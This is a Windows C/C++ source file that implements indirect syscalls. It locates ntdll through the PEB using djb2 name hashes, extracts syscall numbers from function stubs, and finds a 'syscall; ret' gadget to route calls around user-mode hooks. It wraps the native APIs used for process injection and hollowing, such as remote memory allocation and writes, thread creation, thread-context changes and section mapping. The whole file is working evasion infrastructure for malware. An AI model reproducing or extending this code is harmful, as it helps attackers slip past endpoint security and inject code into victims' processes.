#include "../include/indirect_syscall.h"
#include "../../Orchestrator/Config.h"
#include <intrin.h>

#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
extern "C" NTSTATUS SyscallDispatch(PSYSCALL_ENTRY pEntry, ...);
#else
typedef NTSTATUS (NTAPI* fnNtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS (NTAPI* fnNtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS (NTAPI* fnNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS (NTAPI* fnNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI* fnNtSetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI* fnNtGetContextThread)(HANDLE, PCONTEXT);
typedef NTSTATUS (NTAPI* fnNtClose)(HANDLE);
typedef NTSTATUS (NTAPI* fnNtOpenProcess)(PHANDLE, ACCESS_MASK, PVOID, PVOID);
typedef NTSTATUS (NTAPI* fnNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI* fnNtDelayExecution)(BOOLEAN, PLARGE_INTEGER);
typedef NTSTATUS (NTAPI* fnNtCreateSection)(PHANDLE, ACCESS_MASK, PVOID, PLARGE_INTEGER, ULONG, ULONG, HANDLE);
typedef NTSTATUS (NTAPI* fnNtMapViewOfSection)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
typedef NTSTATUS (NTAPI* fnNtUnmapViewOfSection)(HANDLE, PVOID);
#endif

PVOID GetModuleBaseByHash(DWORD dwModuleHash) {
    PVOID pPebPtr = (PVOID)__readgsqword(0x60);
    if (!pPebPtr) return NULL;
    typedef struct _PEB_T { UCHAR Reserved1[2]; UCHAR BeingDebugged; UCHAR Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA_FULL Ldr; } PEB_T;
    PEB_T* pPeb = (PEB_T*)pPebPtr;
    if (!pPeb->Ldr) return NULL;
    PPEB_LDR_DATA_FULL pLdr = (PPEB_LDR_DATA_FULL)pPeb->Ldr;
    PLIST_ENTRY pHead = &pLdr->InLoadOrderModuleList;
    PLIST_ENTRY pCurrent = pHead->Flink;
    while (pCurrent != pHead) {
        PLDR_DATA_TABLE_ENTRY_FULL pEntry = CONTAINING_RECORD(pCurrent, LDR_DATA_TABLE_ENTRY_FULL, InLoadOrderLinks);
        if (pEntry->BaseDllName.Buffer && pEntry->BaseDllName.Length > 0) {
            char szName[256] = { 0 };
            int len = pEntry->BaseDllName.Length / sizeof(WCHAR);
            if (len > 255) len = 255;
            for (int i = 0; i < len; i++) {
                WCHAR wc = pEntry->BaseDllName.Buffer[i];
                if (wc >= L'A' && wc <= L'Z') szName[i] = (char)(wc + 32);
                else szName[i] = (char)wc;
            }
            szName[len] = '\0';
            if (djb2_hash_rt(szName) == dwModuleHash) return pEntry->DllBase;
        }
        pCurrent = pCurrent->Flink;
    }
    return NULL;
}

PVOID GetExportByHash(PVOID pModuleBase, DWORD dwFuncHash) {
    if (!pModuleBase) return NULL;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    DWORD dwExportRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD dwExportSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if (!dwExportRVA) return NULL;
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pModuleBase + dwExportRVA);
    PDWORD pdwNames = (PDWORD)((BYTE*)pModuleBase + pExport->AddressOfNames);
    PDWORD pdwFunctions = (PDWORD)((BYTE*)pModuleBase + pExport->AddressOfFunctions);
    PWORD pwOrdinals = (PWORD)((BYTE*)pModuleBase + pExport->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szFuncName = (const char*)((BYTE*)pModuleBase + pdwNames[i]);
        if (djb2_hash_rt(szFuncName) == dwFuncHash) {
            DWORD dwFuncRVA = pdwFunctions[pwOrdinals[i]];
            if (dwFuncRVA >= dwExportRVA && dwFuncRVA < (dwExportRVA + dwExportSize)) return NULL;
            return (PVOID)((BYTE*)pModuleBase + dwFuncRVA);
        }
    }
    return NULL;
}

BOOL ExtractSSN(PVOID pFunctionAddr, PDWORD pdwSSN) {
    if (!pFunctionAddr || !pdwSSN) return FALSE;
    BYTE* pBytes = (BYTE*)pFunctionAddr;
    if (pBytes[0] == 0x4C && pBytes[1] == 0x8B && pBytes[2] == 0xD1 && pBytes[3] == 0xB8) {
        *pdwSSN = *(DWORD*)(pBytes + 4);
        return TRUE;
    }
    return FALSE;
}

PVOID FindSyscallGadget(PVOID pNtdllBase, DWORD dwNtdllSize) {
    if (!pNtdllBase) return NULL;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdllBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pNtdllBase + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    PVOID pTextBase = NULL;
    DWORD dwTextSize = 0;
    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            pTextBase = (BYTE*)pNtdllBase + pSection[i].VirtualAddress;
            dwTextSize = pSection[i].Misc.VirtualSize;
            break;
        }
    }
    if (!pTextBase || dwTextSize < 3) return NULL;
    BYTE* pScan = (BYTE*)pTextBase;
    for (DWORD i = 0; i < dwTextSize - 2; i++) {
        if (pScan[i] == 0x0F && pScan[i + 1] == 0x05 && pScan[i + 2] == 0xC3) return &pScan[i];
    }
    return NULL;
}

BOOL InitSyscallTable(PSYSCALL_TABLE pTable) {
    if (!pTable) return FALSE;
    pTable->pNtdllBase = GetModuleBaseByHash(HASH_NTDLL);
    if (!pTable->pNtdllBase) return FALSE;
    
    #if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pTable->pNtdllBase;
    PIMAGE_NT_HEADERS pNtHdr = (PIMAGE_NT_HEADERS)((BYTE*)pTable->pNtdllBase + pDos->e_lfanew);
    pTable->dwNtdllSize = pNtHdr->OptionalHeader.SizeOfImage;
    PVOID pGadget = FindSyscallGadget(pTable->pNtdllBase, pTable->dwNtdllSize);
    if (!pGadget) return FALSE;
    pTable->SyscallAddress = pGadget;

    DWORD targetHashes[] = { HASH_NtAllocateVirtualMemory, HASH_NtWriteVirtualMemory, HASH_NtProtectVirtualMemory, HASH_NtCreateThreadEx, HASH_NtSetContextThread, HASH_NtGetContextThread, HASH_NtClose, HASH_NtOpenProcess, HASH_NtCreateSection, HASH_NtMapViewOfSection, HASH_NtUnmapViewOfSection, HASH_NtQueryInformationProcess, HASH_NtDelayExecution };
    DWORD nTargets = sizeof(targetHashes) / sizeof(targetHashes[0]);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pTable->pNtdllBase + pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD pdwNames = (PDWORD)((BYTE*)pTable->pNtdllBase + pExport->AddressOfNames);
    PDWORD pdwFunctions = (PDWORD)((BYTE*)pTable->pNtdllBase + pExport->AddressOfFunctions);
    PWORD pwOrdinals = (PWORD)((BYTE*)pTable->pNtdllBase + pExport->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)((BYTE*)pTable->pNtdllBase + pdwNames[i]);
        DWORD dwHash = djb2_hash_rt(szName);
        for (DWORD t = 0; t < nTargets; t++) {
            if (dwHash == targetHashes[t]) {
                PVOID pFunc = (PVOID)((BYTE*)pTable->pNtdllBase + pdwFunctions[pwOrdinals[i]]);
                DWORD dwSSN = 0;
                if (ExtractSSN(pFunc, &dwSSN)) {
                    pTable->Entries[pTable->dwCount].dwHash = dwHash;
                    pTable->Entries[pTable->dwCount].dwSSN = dwSSN;
                    pTable->Entries[pTable->dwCount].pSyscallGadget = pGadget;
                    pTable->Entries[pTable->dwCount].pFunctionAddr = pFunc;
                    pTable->Entries[pTable->dwCount].bResolved = TRUE;
                    pTable->dwCount++;
                }
                break;
            }
        }
    }
    return (pTable->dwCount == nTargets);
    #else
    return TRUE;
    #endif
}

PSYSCALL_ENTRY GetSyscallEntry(PSYSCALL_TABLE pTable, DWORD dwHash) {
    if (!pTable) return NULL;
    for (DWORD i = 0; i < pTable->dwCount; i++) {
        if (pTable->Entries[i].dwHash == dwHash && pTable->Entries[i].bResolved) return &pTable->Entries[i];
    }
    return NULL;
}

SYSCALL_TABLE g_SyscallTable = { 0 };

#define GET_NT_FUNC(hash) GetExportByHash(GetModuleBaseByHash(HASH_NTDLL), hash)

NTSTATUS IndirectNtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtAllocateVirtualMemory);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect);
#else
    fnNtAllocateVirtualMemory p = (fnNtAllocateVirtualMemory)GET_NT_FUNC(HASH_NtAllocateVirtualMemory);
    return p ? p(ProcessHandle, BaseAddress, ZeroBits, RegionSize, AllocationType, Protect) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtWriteVirtualMemory);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten);
#else
    fnNtWriteVirtualMemory p = (fnNtWriteVirtualMemory)GET_NT_FUNC(HASH_NtWriteVirtualMemory);
    return p ? p(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToWrite, NumberOfBytesWritten) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtProtectVirtualMemory);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect);
#else
    fnNtProtectVirtualMemory p = (fnNtProtectVirtualMemory)GET_NT_FUNC(HASH_NtProtectVirtualMemory);
    return p ? p(ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PSM_OBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PSM_PS_ATTRIBUTE_LIST AttributeList) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtCreateThreadEx);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList);
#else
    fnNtCreateThreadEx p = (fnNtCreateThreadEx)GET_NT_FUNC(HASH_NtCreateThreadEx);
    return p ? p(ThreadHandle, DesiredAccess, ObjectAttributes, ProcessHandle, StartRoutine, Argument, CreateFlags, ZeroBits, StackSize, MaximumStackSize, AttributeList) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtSetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtSetContextThread);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ThreadHandle, ThreadContext);
#else
    fnNtSetContextThread p = (fnNtSetContextThread)GET_NT_FUNC(HASH_NtSetContextThread);
    return p ? p(ThreadHandle, ThreadContext) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtGetContextThread(HANDLE ThreadHandle, PCONTEXT ThreadContext) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtGetContextThread);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ThreadHandle, ThreadContext);
#else
    fnNtGetContextThread p = (fnNtGetContextThread)GET_NT_FUNC(HASH_NtGetContextThread);
    return p ? p(ThreadHandle, ThreadContext) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtClose(HANDLE Handle) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtClose);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, Handle);
#else
    fnNtClose p = (fnNtClose)GET_NT_FUNC(HASH_NtClose);
    return p ? p(Handle) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PSM_OBJECT_ATTRIBUTES ObjectAttributes, PSM_CLIENT_ID ClientId) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtOpenProcess);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);
#else
    fnNtOpenProcess p = (fnNtOpenProcess)GET_NT_FUNC(HASH_NtOpenProcess);
    return p ? p(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtQueryInformationProcess(HANDLE ProcessHandle, ULONG ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtQueryInformationProcess);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
#else
    fnNtQueryInformationProcess p = (fnNtQueryInformationProcess)GET_NT_FUNC(HASH_NtQueryInformationProcess);
    return p ? p(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtDelayExecution);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, (HANDLE)(ULONG_PTR)Alertable, DelayInterval);
#else
    fnNtDelayExecution p = (fnNtDelayExecution)GET_NT_FUNC(HASH_NtDelayExecution);
    return p ? p(Alertable, DelayInterval) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtCreateSection(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, PSM_OBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtCreateSection);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle);
#else
    fnNtCreateSection p = (fnNtCreateSection)GET_NT_FUNC(HASH_NtCreateSection);
    return p ? p(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, SectionPageProtection, AllocationAttributes, FileHandle) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtMapViewOfSection(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD InheritDisposition, ULONG AllocationType, ULONG Win32Protect) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtMapViewOfSection);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect);
#else
    fnNtMapViewOfSection p = (fnNtMapViewOfSection)GET_NT_FUNC(HASH_NtMapViewOfSection);
    return p ? p(SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect) : (NTSTATUS)0xC0000001;
#endif
}

NTSTATUS IndirectNtUnmapViewOfSection(HANDLE ProcessHandle, PVOID BaseAddress) {
#if defined(FEATURE_INDIRECT_SYSCALLS_ENABLED)
    PSYSCALL_ENTRY pE = GetSyscallEntry(&g_SyscallTable, HASH_NtUnmapViewOfSection);
    if (!pE) return (NTSTATUS)0xC0000001;
    return SyscallDispatch(pE, ProcessHandle, BaseAddress);
#else
    fnNtUnmapViewOfSection p = (fnNtUnmapViewOfSection)GET_NT_FUNC(HASH_NtUnmapViewOfSection);
    return p ? p(ProcessHandle, BaseAddress) : (NTSTATUS)0xC0000001;
#endif
}
